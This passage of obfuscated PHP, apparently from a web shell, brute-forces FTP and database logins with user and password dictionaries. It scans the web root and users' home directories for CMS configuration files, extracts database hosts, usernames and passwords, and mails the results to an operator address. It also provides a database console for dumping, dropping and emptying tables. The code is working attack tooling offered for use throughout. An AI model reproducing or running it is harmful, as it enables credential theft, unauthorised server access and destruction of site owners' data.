                    $test = z2t($brh, $brp, $time, $brtest1, $brtest2, $brtest3, $brtest4, $bru, $passwd);
                    if (!$test) {
                        $stop = 1;
                        break;
                    }
                    z2w($test[0], $test[1], $test[2]);
                }
            }
            echo "\r\n--------------------\r\n";
            echo z9s("426", $count) . "\r\n";
            echo z9s("427", $success) . "\r\n";
        } elseif ($bmysql || $bmssql || $boracle || $bpostgres) {
            $success = 0;
            $count = 0;
            if (!@empty($bru)) {
                $test = z2e($brh, $brp, $bservice, $brtest1, $brtest2, $brtest3, $brtest4, $bru, NULL, (!@empty($brdb) ? $brdb : ''));
                z2w($test[0], $test[1], $test[2]);
            }
            if ($brm == "2" || $brm == "3") {
                foreach ($users as $user) {
                    $test = z2e($brh, $brp, $bservice, $brtest1, $brtest2, $brtest3, $brtest4, $user, NULL, (!@empty($brdb) ? $brdb : ''));
                    z2w($test[0], $test[1], $test[2]);
                    if ($brm == "3") {
                        foreach ($dictionary as $passwd) {
                            $test = z2e($brh, $brp, $bservice, $brtest1, $brtest2, $brtest3, $brtest4, $user, $passwd, (!@empty($brdb) ? $brdb : ''));
                            z2w($test[0], $test[1], $test[2]);
                        }
                    }
                }
            } else if ($brm == "1" && !@empty($bru)) {
                foreach ($dictionary as $passwd) {
                    $test = z2e($brh, $brp, $bservice, $brtest1, $brtest2, $brtest3, $brtest4, $bru, $passwd, (!@empty($brdb) ? $brdb : ''));
                    z2w($test[0], $test[1], $test[2]);
                }
            }
            echo "\r\n--------------------\r\n";
            echo z9s("426", $count) . "\r\n";
            echo z9s("427", $success) . "\r\n";
            echo $log;
        }
        if ($brute_log == "1" && $success > 0) {
            @mail($brute_email, "$bservice|$brh:$brp", $log);
        }
        echo z5q() . z7u() . z7g() . z10w() . z6d();
    }
    if (@isset($sqlfind) && $sqlfind && !@empty($dvuser) && !@empty($dvpass)) {
        echo z2b(z9s("330")) . z6d();
        echo z9m('2') . z7p() . z6w() . z5w("", "1");
        z5p();
        $dpaths = $glob = array();
        $farr = @explode(";", $dvfiles);
        if ($dvdefined == "all" && @isset($arr_mass_paths) && @is_array($arr_mass_paths) && @count($arr_mass_paths) > 0) {
            $farr = $arr_mass_paths;
        }
        $wildcards = @implode(";", $farr);
        switch ($dvfind) {
        case 'dvdir':
            $dpaths[] = z1a($dvdir);
            break;
        case 'docroot':
            $dpaths[] = z1a($wwwdir);
            break;
        case 'passwd':
            $uarr = z6m(1);
            if (@count($uarr) > 0) {
                foreach ($uarr as $uk => $arr) {
                    if (!@in_array($arr[1], $dpaths) && $arr[1] != '/' && !@preg_match('#^(/var/run|/var/log|/var/cache|/var/mail|/var/cache|/var/backup|/usr/games|/lib|/var/lib|/var/tmp|/tmp|/dev|/proc|/sbin|/usr/sbin|/usr/local/sbin|/bin|/usr/bin|/usr/local/bin)#', $arr[1]) && z4j($arr[1])) {
                        $dpaths[] = z1a($arr[1]);
                    }
                }
            }
            unset($uarr);
            break;
        default:
            break;
        }
        foreach ($dpaths as $dpath) {
            $tglob = z5s($dpath, $wildcards, $dtrecursive, (($dsfunc == "find") ? true : false));
            if (@is_array($tglob) && @count($tglob) > 0) {
                foreach ($tglob as $tfile) {
                    if (!@in_array($tfile, $glob)) {
                        $glob[] = $tfile;
                    }
                }
            }
        }
        $glob = @array_unique($glob);
        unset($dpaths);
        if (@count($glob) > 0) {
            $uhashes = array();
            $log = '';
            $line = @str_repeat("-", 100) . "\r\n";
            $final_arr = array();
            foreach ($glob as $file) {
                $tct = z9p($file);
                if (!@empty($tct)) {
                    if ($dvdefined == "all" && @isset($arr_mass) && @is_array($arr_mass) && @count($arr_mass) > 0) {
                        foreach ($arr_mass as $software => $defines) {
                            $base = "";
                            $user = z4b($defines[1], $defines[0], $tct);
                            $pass = z4b($defines[3], $defines[2], $tct);
                            if (!@empty($defines[4])) {
                                $base = z4b($defines[5], $defines[4], $tct);
                            }
                            if (!@empty($defines[6])) {
                                $host = z4b($defines[7], $defines[6], $tct);
                            }
                            if (!@isset($host) || @empty($host)) {
                                $host = "localhost";
                            }
                            if (!@empty($host) && !@empty($user) && !@empty($pass)) {
                                $add = 0;
                                if (@isset($dvsqltest) && $dvsqltest) {
                                    if (z4u($host, $user, $pass, "3306", "MySQL") == "valid") {
                                        $add = 1;
                                    }
                                } else {
                                    $add = 1;
                                }
                                if ($add) {
                                    $tmphash = @md5($host . $user . $pass . $base);
                                    if (!@in_array($tmphash, $uhashes)) {
                                        $uhashes[] = $tmphash;
                                        $tmp = $line;
                                        $tmp .= "$file\r\n";
                                        $tmp .= "Software tested: $software\r\n";
                                        $tmp .= $line;
                                        $tmp .= "host: $host\r\n";
                                        $tmp .= "user: $user\r\n";
                                        $tmp .= "pass: $pass\r\n";
                                        $tmp .= "database: $base\r\n\r\n";
                                        echo $tmp;
                                        $log .= $tmp;
                                        if (!@isset($final_arr[$file])) {
                                            $final_arr[$file] = array($host, $user, $pass, $base, $software);
                                        }
                                    }
                                    break;
                                }
                            }
                        }
                    } else {
                        $base = "";
                        $user = z4b($dtuser, $dvuser, $tct);
                        $pass = z4b($dtpass, $dvpass, $tct);
                        if (!@empty($dvbase)) {
                            $base = z4b($dtbase, $dvbase, $tct);
                        }
                        if (!@empty($dvhost)) {
                            $host = z4b($dthost, $dvhost, $tct);
                        }
                        if (!@isset($host) || @empty($host)) {
                            $host = "localhost";
                        }
                        if (!@empty($host) && !@empty($user) && !@empty($pass)) {
                            $add = 0;
                            if (@isset($dvsqltest) && $dvsqltest) {
                                if (z4u($host, $user, $pass, "3306", "MySQL") == "valid") {
                                    $add = 1;
                                }
                            } else {
                                $add = 1;
                            }
                            if ($add) {
                                $tmphash = @md5($host . $user . $pass . $base);
                                if (!@in_array($tmphash, $uhashes)) {
                                    $uhashes[] = $tmphash;
                                    $tmp = $line;
                                    $tmp .= "$file\r\n";
                                    $tmp .= $line;
                                    $tmp .= "host: $host\r\n";
                                    $tmp .= "user: $user\r\n";
                                    $tmp .= "pass: $pass\r\n";
                                    $tmp .= "database: $base\r\n\r\n";
                                    echo $tmp;
                                    $log .= $tmp;
                                    if (!@isset($final_arr[$file])) {
                                        $final_arr[$file] = array($host, $user, $pass, $base);
                                    }
                                }
                            }
                        }
                    }
                }
                unset($tct);
            }
        }
        echo z5q() . z7u() . z7g() . z10w() . z6d();
        if ($dv_log == "1" && $log != '') {
            @mail($dv_email, "DBS|$saddr", $log);
        }
    }
    if (@isset($final_arr) && @count($final_arr) > 0) {
        echo z9m("2") . z7i(z9j(z9s("331"), "13", "2") . z9j(z9s("332"), "13") . z9j(z9s("333"), "13") . z9j(z9s("334"), "13") . z9j(z9s("335"), "13", "3"));
        $tr = 0;
        foreach ($final_arr as $file => $array) {
            echo z6g(($tr % 2 ? '0' : '1'));
            $tc = @count($array);
            $dsoft = '';
            if ($tc == 5) {
                $tc = 4;
                $dsoft = $array[$tc];
            }
            for ($i = 0; $i < $tc; $i++) {
                echo z9j($array[$i], "14", ($i == 0 ? "2" : ""));
            }
            echo z9j(z5c(array("act" => "sql", "d", "sql_refresh" => "1", "sql_server" => $array[0], "sql_user" => $array[1], "sql_pass" => $array[2], "sql_db" => $array[3], "sql_port" => "3306", "sql_engine" => "MySQL"), z8v(z9s("336"), "7") . (($dsoft != '') ? " (" . $dsoft . ")" : ''), 1), "14", "3");
            echo z7u();
            $tr++;
        }
    }
}
if ($act == 'sql') {
    $hideconnect = 0;
    $hmsg = '';
    if (@isset($sql_act) && $sql_act == "logoff") {
        z0u('sql_server');
        z0u('sql_user');
        z0u('sql_pass');
        z0u('sql_port');
        z0u('sql_engine');
        z0u('sql_session');
        z0u('sql_sort');
    }
    $sql_session = 0;
    if (@isset($_SESSION['sql_session'])) {
        if (!@isset($sql_refresh) || !$sql_refresh) {
            $sql_server = $_SESSION['sql_server'];
            $sql_user = $_SESSION['sql_user'];
            $sql_pass = $_SESSION['sql_pass'];
            $sql_port = $_SESSION['sql_port'];
            $sql_engine = $_SESSION['sql_engine'];
            if (!@isset($sql_sort)) {
                $sql_sort = $_SESSION['sql_sort'];
            }

            $sql_session = 1;
        } else {
            z0u('sql_server');
            z0u('sql_user');
            z0u('sql_pass');
            z0u('sql_port');
            z0u('sql_engine');
            z0u('sql_session');
            z0u('sql_sort');
        }
    }
    if (!@empty($sql_server) && !@empty($sql_port) && !@empty($sql_user) && @isset($sql_pass) && !@empty($sql_engine)) {
        if (!@isset($sql_db)) {
            $sql_db = '';
        }

        $sql = new my_sql();
        $sql->db = $sql_engine;
        $sql->host = $sql_server;
        $sql->port = $sql_port;
        $sql->user = $sql_user;
        $sql->pass = $sql_pass;
        $sql->base = $sql_db;
        if ($sql->connect()) {
            $hideconnect = 1;
            if (!@isset($sql_sort)) {
                $sql_sort = "0a";
            }

            $_SESSION['sql_server'] = $sql_server;
            $_SESSION['sql_user'] = $sql_user;
            $_SESSION['sql_pass'] = $sql_pass;
            $_SESSION['sql_port'] = $sql_port;
            $_SESSION['sql_engine'] = $sql_engine;
            $_SESSION['sql_session'] = 1;
            $_SESSION['sql_sort'] = $sql_sort;
            $hideconnect = 1;
            $db_actions = array("select" => "Select", "dump" => "Dump", "drop" => "Drop");
            $table_actions = array("browse" => "Browse", "dump" => "Dump", "drop" => "Drop", "empty" => "Empty", "insert" => "Insert");
            echo z2b(z9m('2') . z7i(z6x(z5c(array("act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine"), z8v(z9s("352"), (!@isset($sql_act) || !@in_array($sql_act, array("query", "emails", "serverstatus", "servervars", "processes")) ? "12" : "14"))) . z5c(array("act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "query", "sql_db"), z8v(z9s("353"), (@isset($sql_act) && $sql_act == "query" ? "12" : "14"))) . z5c(array("act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "emails", "sql_db"), z8v(z9s("354"), (@isset($sql_act) && $sql_act == "emails" ? "12" : "14"))) . z5c(array("act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "serverstatus"), z8v(z9s("355"), (@isset($sql_act) && $sql_act == "serverstatus" ? "12" : "14"))) . z5c(array("act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "servervars"), z8v(z9s("356"), (@isset($sql_act) && $sql_act == "servervars" ? "12" : "14"))) . z5c(array("act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "processes"), z8v(z9s("357"), (@isset($sql_act) && $sql_act == "processes" ? "12" : "14"))) . z5c(array("act" => "sql", "d", "sql_act" => "logoff"), z8v(z9s("358"), "14")), "")) . z10w());
            if ($sql_engine == "MySQL") {
                if (!@isset($sql_act)) {
                    if (@isset($sql_db) && !@empty($sql_db)) {
                        $sql->base = $sql_db;
                        if ($sql->select_db()) {
                            $sql_act = "db_act";
                            $db_act = "select";
                        } else {
                            $sql_act = "showdb";
                            $sql_db = "";
                            $sql->base = "";
                        }
                    } else {
                        $sql_act = "showdb";
                    }
                }
                $dbs = $sql->list_dbs();
                $db_list = array('' => z9s("367", @count($dbs)));
                foreach ($dbs as $k => $v) {
                    $db_list[$k] = $v;
                }
                if ($sql_act == "db_act" && @isset($db_act) && !@empty($sql_db)) {
                    switch ($db_act) {
                    case 'dump':
                        $sql_act = "dump";
                        break;
                    case 'drop':
                        if (@isset($drop_confirm) && $drop_confirm) {
                            $sql->query('DROP DATABASE ' . $sql_db . ';');
                            $sql_act = "showdb";
                            $sql_db = "";
                        } else {
                            $sql_act = "dropdb";
                        }
                        break;
                    }
                } elseif ($sql_act == "table_act" && @isset($table_act) && !@empty($sel_table)) {
                    switch ($table_act) {
                    case 'dump':
                        $sql_act = "dump";
                        break;
                    case 'drop':
                        if (@isset($drop_confirm) && $drop_confirm) {
                            $sql->base = $sql_db;
                            if ($sql->select_db()) {
                                $sql->query('DROP TABLE ' . $sel_table . ';');
                            }
                            $sel_table = "";
                            $sql_act = "db_act";
                            $db_act = "select";
                        } else {
                            $sql_act = "droptable";
                        }
                        break;
                    case 'empty':
                        if (@isset($empty_confirm) && $empty_confirm) {
                            $sql->base = $sql_db;
                            if ($sql->select_db()) {
                                $sql->query('DELETE FROM ' . $sel_table . ';');
                            }
                            $sql_act = "table_act";
                            $table_act = "browse";
                        } else {
                            $sql_act = "empty";
                        }
                        break;
                    case 'insert':
                        break;
                    case 'delete':
                        $sql->base = $sql_db;
                        if ($sql->select_db()) {
                            $sql->query('DELETE FROM ' . $sel_table . ' WHERE ' . $sql_tbl_insert_q . ' LIMIT 1;');
                        }
                        $table_act = "browse";
                        break;
                    }
                }
                if (!@in_array($sql_act, array("showdb", "query", "serverstatus", "servervars", "processes", "emails"))) {
                    $db_submit_acts = $table_submit_acts = '';
                    foreach ($db_actions as $dk => $dv) {
                        $db_submit_acts .= z6p($dk, $dv, "7");
                    }
                    foreach ($table_actions as $tk => $tv) {
                        $table_submit_acts .= z5c(array("act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act", "table_act" => $tk, "sql_db", "sel_table"), z6p($tk, $tv, "7"));
                    }

                    $table_submit_acts = z10e(z7i(z9j($table_submit_acts)), "2");
                    $db_table = z10e(z7i(z6x(z8e(z9s("364")) . z5c(array("act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "db_act"), z4a("sql_db", $db_list, "0", 1) . z4a("db_act", $db_actions, "1") . z8v(z9s("92"), "7")))), "2");
                    if (@isset($sql_db) && !@empty($sql_db)) {
                        $sql->base = $sql_db;
                        if ($sql->select_db()) {
                            $table_list = array('' => "-");
                            $sql->query('SHOW TABLES FROM ' . $sql_db . ';');
                            if ($sql->get_result()) {
                                for ($i = 0; $i < $sql->num_rows; $i++) {
                                    foreach ($sql->rows[$i] as $rk => $rv) {
                                        $table_list[$rv] = $rv . " (" . $sql->count_rows($rv) . ")";
                                    }
                                }
                            }
                            $table_table = z10e(z7i(z6x(z8e(z9s("365")) . z5c(array("act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "table_act", "sql_db"), z4a("sel_table", $table_list, "0", 1) . z4a("table_act", $table_actions, "1") . z8v(z9s("92"), "7")))), "2");
                        }
                    }
                    echo z2b((@isset($table_table) ? array($db_table, $table_table) : $db_table));
                    if ($sql_act == "dropdb") {
                        echo z6d();
                        echo z10e(z7i(z6x(z8e(z9s("437", $sql_db)) . z5c(array("act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "db_act", "db_act" => "drop", "sql_db", "drop_confirm" => "1"), z8v(z9s("21"), "7")) . z9c() . z5c($back_form_actions, z8v(z9s("22"), '7')))), "2");
                        echo z6d();
                    } elseif ($sql_act == "droptable") {
                        echo z6d();
                        echo z10e(z7i(z6x(z8e(z9s("438", $sel_table)) . z5c(array("act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "table_act", "table_act" => "drop", "sql_db", "sel_table", "drop_confirm" => "1"), z8v(z9s("21"), "7")) . z9c() . z5c($back_form_actions, z8v(z9s("22"), '7')))), "2");
                        echo z6d();
                    } elseif ($sql_act == "empty") {
                        echo z6d();
                        echo z10e(z7i(z6x(z8e(z9s("439", $sel_table)) . z5c(array("act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "table_act", "table_act" => "empty", "sql_db", "sel_table", "empty_confirm" => "1"), z8v(z9s("21"), "7")) . z9c() . z5c($back_form_actions, z8v(z9s("22"), '7')))), "2");
                        echo z6d();
                    } elseif ($sql_act == "dump") {
                        if (!@isset($dump_filename)) {
                            $dump_filename = $tempdir . "dump_" . @getenv("SERVER_NAME") . "_db_" . @date("d-m-Y_H-i-s") . ".sql";
                        }
                        if (@isset($sql_db) && !@empty($sql_db)) {
                            $sql->base = $sql_db;
                            if ($sql->select_db()) {
                                $table_list = array();
                                $sql->query('SHOW TABLES FROM ' . $sql_db . ';');
                                if ($sql->get_result()) {
                                    for ($i = 0; $i < $sql->num_rows; $i++) {
                                        foreach ($sql->rows[$i] as $rk => $rv) {
                                            $table_list[] = $rv;
                                        }
                                    }
                                }
                            }
                        }
                        if (!@isset($sql_tables) || @empty($sql_tables)) {
                            if (@isset($sel_table) && !@empty($sel_table)) {
                                $sql_tables = $sel_table;
                            } else {
                                $sql_tables = (@count($table_list) > 0 ? @implode(",", $table_list) : "");
                            }
                        } elseif (@isset($table_list) && @is_array($table_list)) {
                            $tmp_tables = @explode(",", $sql_tables);
                            $sql_tables = "";
                            foreach ($tmp_tables as $tmp_table) {
                                $tmp_table = @trim($tmp_table);
                                if (@in_array($tmp_table, $table_list)) {
                                    $sql_tables .= $tmp_table . ",";
                                } else {
                                    break;
                                }
                            }
                            if (@empty($sql_tables)) {
                                $sql_tables = @implode(",", $table_list);
                            }
                        }
                        echo z2b(z9s("440"));
                        echo z9m("2") . z5c(array("act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "dump", "dump_confirm" => "1"), z5n() . z7i(z5t(z9s("441")) . z9j(z4a("sql_db", $db_list, "7", 1))) . z7i(z5t(z9s("442")) . z9j(z5w("sql_tables", "5") . (@isset($sql_tables) ? @htmlspecialchars($sql_tables) : "") . z5q())) . z7i(z5t(z9s("443")) . z9j(z5u("dump_filename", $dump_filename, "7"))) . z7i(z5t(z9c()) . z9j(z5y("sql_save2file", z9s("444"), "sql_save2file") . z9c() . z5y("sql_download", z9s("445"), "sql_download"))) . z7i(z5t(z9c()) . z9j(z8v(z9s("446"), "7"))) . z5n()) . z10w();
                        if (@isset($dump_confirm) && $dump_confirm) {
                            $fp = 0;
                            if (@isset($sql_save2file) && $sql_save2file == "1" && @isset($dump_filename) && !@empty($dump_filename)) {
                                if (z4q($dump_filename)) {
                                    @unlink($dump_filename);
                                }

                                $fp = @fopen($dump_filename, "a");
                            }
                            $dumping_arr = array();
                            $tmp_tables = @explode(",", $sql_tables);
                            foreach ($tmp_tables as $tmp_table) {
                                $tmp_table = @trim($tmp_table);
                                $dumping_arr[] = $tmp_table;
                            }
                            $dumping_arr = @array_unique($dumping_arr);
                            $sql->base = $sql_db;
                            if (!$sql->select_db()) {
                                echo z2b(z9s("447"));
                            } elseif (@count($dumping_arr) < 1) {
                                echo z2b(z9s("448"));
                            } else {
                                if (@isset($sql_download) && $sql_download == "1") {
                                    @ob_clean();
                                    @header("Content-type: application/octet-stream");
                                    @header("Content-disposition: attachment; filename=\"" . @basename($dump_filename) . "\";");
                                    foreach ($dumping_arr as $dump_table) {
                                        if ($sql->dump($dump_table)) {
                                            foreach ($sql->dump as $v) {
                                                echo $v . "\r\n";
                                            }
                                        }
                                    }
                                    exit();
                                }
                                if (!@isset($sql_save2file) || $sql_save2file != "1") {
                                    echo z9m('2') . z6g() . z6w() . z5w('', '1');
                                    foreach ($dumping_arr as $dump_table) {
                                        if ($sql->dump($dump_table)) {
                                            foreach ($sql->dump as $v) {
                                                echo @htmlspecialchars($v) . "\r\n";
                                            }
                                        }
                                    }
                                    echo z5q() . z7g() . z7u() . z10w() . z6d();
                                } elseif ($fp) {
                                    foreach ($dumping_arr as $dump_table) {
                                        if ($sql->dump($dump_table)) {
                                            foreach ($sql->dump as $v) {
                                                if (!@fwrite($fp, $v . "\r\n")) {
                                                    @fputs($fp, $v . "\r\n");
                                                }
                                            }
                                        }
                                    }
                                    @fclose($fp);
                                    if (z4q($dump_filename)) {
                                        echo z2b(z9s("449", $dump_filename));
                                    } else {
                                        echo z2b(z9s("450"));
                                    }
                                } else {
                                    echo z2b(z9s("450"));
                                }
                            }
                        }
                    }
                    if ($sql_act == "table_act" && @isset($table_act) && ($table_act == "browse" || $table_act == "insert") && @isset($sel_table) && !@empty($sel_table)) {
                        $crows = $sql->count_rows($sel_table);
                        $sql->parse_fields($sel_table);
                        $cfields = $sql->num_fields;
                        $fields = $sql->columns;
                        if ($table_act == "insert") {
                            if (@isset($sql_tbl_insert_radio) && !@empty($sql_tbl_insert_radio)) {
                                if ($sql_tbl_insert_radio == 1) {
                                    $keys = "";
                                    $akeys = @array_keys($sql_tbl_insert);
                                    foreach ($akeys as $v) {
                                        $keys .= "`" . @addslashes($v) . "`, ";
                                    }
                                    if (!@empty($keys)) {
                                        $keys = @substr($keys, 0, @strlen($keys) - 2);
                                    }
                                    $values = "";
                                    $i = 0;
                                    foreach (@array_values($sql_tbl_insert) as $v) {
                                        if ($funct = $sql_tbl_insert_functs[$akeys[$i]]) {
                                            $values .= $funct . " (";
                                        }
                                        $values .= "'" . @addslashes($v) . "'";
                                        if ($funct) {
                                            $values .= ")";
                                        }
                                        $values .= ", ";
                                        $i++;
                                    }
                                    if (!@empty($values)) {
                                        $values = @substr($values, 0, @strlen($values) - 2);
                                    }
                                    $sql->query("INSERT INTO `" . $sel_table . "` ( " . $keys . " ) VALUES ( " . $values . " );");
                                } elseif ($sql_tbl_insert_radio == 2) {
                                    $set = z1r($sql_tbl_insert, ", ", $sql_tbl_insert_functs);
                                    $sql->query("UPDATE `" . $sel_table . "` SET " . $set . " WHERE " . $sql_tbl_insert_q . " LIMIT 1;");
                                }
                                $table_act = "browse";
                            } else {
                                echo z2b(array("INSERT INTO TABLE " . $sel_table), "1");
                                if (!@isset($sql_tbl_insert) || !@is_array($sql_tbl_insert)) {
                                    $sql_tbl_insert = array();
                                }
                                if (!@empty($sql_tbl_insert_q)) {
                                    $sql->query("SELECT * FROM `" . $sel_table . "` WHERE " . $sql_tbl_insert_q . " LIMIT 1;");
                                    $values = @mysql_fetch_assoc($sql->res);
                                    @mysql_free_result($sql->res);
                                } else {
                                    $values = array();
                                }
                                echo z9l() . z9b("act", "sql") . z9b("sql_server") . z9b("sql_user") . z9b("sql_pass") . z9b("sql_port") . z9b("sql_engine") . z9b("d") . z9b("sql_act", "table_act") . z9b("table_act", "insert") . z9b("sel_table") . z9b("sql_db") . z9b("sql_tbl_insert_q") . z9m("2") . z7i(z9j("Field", "13", "2") . z9j("Type", "13") . z9j("Function", "13") . z9j("Value", "13", "3"));
                                $sql->query("SHOW FIELDS FROM `" . $sel_table . "`;");
                                $sql->get_result();
                                for ($i = 0; $i < $sql->num_rows; $i++) {
                                    $field = $sql->rows[$i];
                                    $name = $field["Field"];
                                    if (empty($sql_tbl_insert_q)) {
                                        $v = "";
                                    }
                                    echo z9f(z9j(z8e(@htmlspecialchars($name)), "14", "2") . z9j($field["Type"], "14") . z9j(z4a("sql_tbl_insert_functs[" . @htmlspecialchars($name) . "]", array("" => "", "PASSWORD" => "PASSWORD", "MD5" => "MD5", "ENCRYPT" => "ENCRYPT", "ASCII" => "ASCII", "CHAR" => "CHAR", "RAND" => "RAND", "LAST_INSERT_ID" => "LAST_INSERT_ID", "COUNT" => "COUNT", "AVG" => "AVG", "SUM" => "SUM", " " => "--------", "SOUNDEX" => "SOUNDEX", "LCASE" => "LCASE", "UCASE" => "UCASE", "NOW" => "NOW", "CURDATE" => "CURDATE", "CURTIME" => "CURTIME", "FROM_DAYS" => "FROM_DAYS", "FROM_UNIXTIME" => "FROM_UNIXTIME", "PERIOD_ADD" => "PERIOD_ADD", "PERIOD_DIFF" => "PERIOD_DIFF", "TO_DAYS" => "TO_DAYS", "UNIX_TIMESTAMP" => "UNIX_TIMESTAMP", "USER" => "USER", "WEEKDAY" => "WEEKDAY", "CONCAT" => "CONCAT"), "5"), "14") . z9j(z6i("sql_tbl_insert[" . (@isset($name) ? @htmlspecialchars($name) : "") . "]", (@isset($values["$name"]) ? @htmlspecialchars($values["$name"]) : ""), "7"), "14", "3"), ($i % 2 ? '0' : '1'));
                                }
                                echo z10w();
                                $iradio = '<input type="radio" id="insert" style="vertical-align: middle;" name="sql_tbl_insert_radio" value="1"' . (@empty($sql_tbl_insert_q) ? " checked" : "") . '><label for="insert">' . z9s("405") . '</label>';
                                if (!@empty($sql_tbl_insert_q)) {
                                    $iradio .= z9c() . z9s("406") . z9c() . '<input type="radio" id="save" style="vertical-align: middle;" name="sql_tbl_insert_radio" value="2" checked><label for="save">' . z9s("407") . '</label>';
                                    $iradio .= z9b("sql_tbl_insert_q", @htmlspecialchars($sql_tbl_insert_q));
                                }
                                echo z2b($iradio . z9c("3") . z8v(z9s("408"), "7"));
                                echo z9z();
                            }
                        }
                        if ($table_act == "browse") {
                            if (!@isset($sql_from) || !@is_numeric($sql_from)) {
                                $sql_from = 0;
                            }
                            if (!@isset($sql_limit) || !@is_numeric($sql_limit)) {
                                $sql_limit = 50;
                            }
                            if (!@isset($sql_page) || !@is_numeric($sql_page)) {
                                $sql_page = 0;
                            }

                            $psql_sort = z5r($sql_sort);
                            if ($psql_sort[1] != 'a') {
                                $psql_sort[1] = 'd';
                            } else {
                                $psql_sort[1] = 'a';
                            }
                            if ($psql_sort[0] > ($cfields - 1)) {
                                $psql_sort[0] = '0';
                            }

                            $v = $psql_sort[0];
                            if ($crows > $sql_limit) {
                                $pages = @ceil($crows / $sql_limit);
                                $tmpsort = "";
                                if (@is_array($fields) && @isset($fields[$psql_sort[0]])) {
                                    $tmpsort = ' ORDER BY `' . $fields[$psql_sort[0]] . '` ' . ($psql_sort[1] == "a" ? 'ASC' : 'DESC');
                                }
                                $table_limit = $tmpsort . ' LIMIT ' . ($sql_limit * $sql_page) . ',' . $sql_limit;
                            } else {
                                $table_limit = '';
                                $pages = 0;
                            }
                            $ar_pages = array();
                            for ($i = 0; $i < $pages; $i++) {
                                $ar_pages[$i] = z9s("397") . " " . ($i + 1);
                            }
                            if (@count($ar_pages) < 1) {
                                $ar_pages = array("0" => z9s("397") . " 1");
                            }

                            echo z2b(array(z9s("395", array($sel_table, $cfields, $crows)), z10e(z9f(z7e(($sql_page > 0 ? z5c(array("act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act", "table_act", "sql_db", "sel_table", "sql_page" => ($sql_page == "1" ? "NULL" : ($sql_page - 1))), z8v(z9s("396"), "7")) : z8v(z9s("396"), "7")) . z5c(array("act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act", "table_act", "sql_db", "sel_table"), z4a("sql_page", $ar_pages, "1", 1) . z8v(z9s("398"), "7")) . ($sql_page < ($pages - 1) ? z5c(array("act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act", "table_act", "sql_db", "sel_table", "sql_page" => ($sql_page + 1)), z8v(z9s("399"), "7")) : z8v(z9s("399"), "7")))), "2")), "1");
                            $sql->query('SELECT * FROM ' . $sel_table . $table_limit . ';');
                            if ($sql->get_result()) {
                                echo z9m('2') . z7p() . z7k() . z5x('', "0") . z9m("2") . z7p() . z7k();
                                echo z9m('2');
                                echo z6g();
                                for ($i = 0; $i < @count($sql->columns); $i++) {
                                    echo ($i == 0 ? z9j(z9s("62"), "13", "2") : "") . z9j(z5c(array("act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act", "table_act", "sql_db", "sel_table", "sql_page", "sql_sort" => ($psql_sort[0] == "$i" ? "$i" . ($psql_sort[1] == "a" ? "d" : "a") : "$i" . $psql_sort[1])), z8v($sql->columns[$i] . ($psql_sort[0] == "$i" ? ' ' . ($psql_sort[1] == "a" ? '&uarr;' : '&darr;') : ''), '3')), "13", ($i == (@count($sql->columns) - 1) ? '3' : ''));
                                }
                                echo z7u();
                                $print_arr = array();
                                for ($i = 0; $i < $sql->num_rows; $i++) {
                                    if (@is_array($sql->rows[$i])) {
                                        $tmparr = array();
                                        foreach ($sql->rows[$i] as $rk => $rv) {
                                            $tmparr[] = $rv;
                                        }
                                        $print_arr[] = $tmparr;
                                    }
                                }
                                @usort($print_arr, "z3i");
                                if ($psql_sort[1] == "d") {
                                    $print_arr = @array_reverse($print_arr);
                                }
                                for ($i = 0; $i < @count($print_arr); $i++) {
                                    echo z6g(($i % 2 ? '0' : '1'));
                                    $cr = 0;
                                    foreach ($print_arr[$i] as $rv) {
                                        $w = "";
                                        for ($a = 0; $a < $sql->num_fields; $a++) {
                                            $w .= " `" . $sql->columns[$a] . "` = '" . @addslashes($print_arr[$i][$a]) . "' AND";
                                        }
                                        if ($a > 0) {
                                            $w = @substr($w, 0, @strlen($w) - 3);
                                        }

                                        echo ($cr == 0 ? z9j("<nobr>" . z5c(array("act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "table_act", "sql_db", "sel_table", "sql_tbl_insert_q" => $w), z4a("table_act", array("insert" => "Edit", "delete" => "Delete"), "3") . z8v("&raquo;", "6")) . "</nobr>", "14", "28") : "") . z9j((@is_null($rv) ? 'NULL' : @htmlspecialchars($rv)), "14", ($cr == (@count($print_arr[$i]) - 1) ? '3' : ''));
                                        $cr++;
                                    }
                                    echo z7u();
                                }
                                echo z10w() . z7g() . z7u() . z10w() . z5j() . z7g() . z7u() . z10w();
                            }
                        }
                    } elseif ($sql_act == "db_act" && @isset($db_act) && $db_act == "select" && @isset($sql_db) && !@empty($sql_db)) {
                        echo z2b(z9s("366", $sql_db), "1");
                        $sql->query('SHOW TABLE STATUS;');
                        if ($sql->get_result()) {
                            $psql_sort = z5r($sql_sort);
                            if ($psql_sort[1] != 'a') {
                                $psql_sort[1] = 'd';
                            } else {
                                $psql_sort[1] = 'a';
                            }
                            if ($psql_sort[0] >= $sql->num_fields) {
                                $psql_sort[0] = '0';
                            }

                            $v = $psql_sort[0];
                            echo z9m('2') . z7p() . z7k() . z5x('', "0") . z9m("2") . z7p() . z7k();
                            echo z9m('2') . z6g();
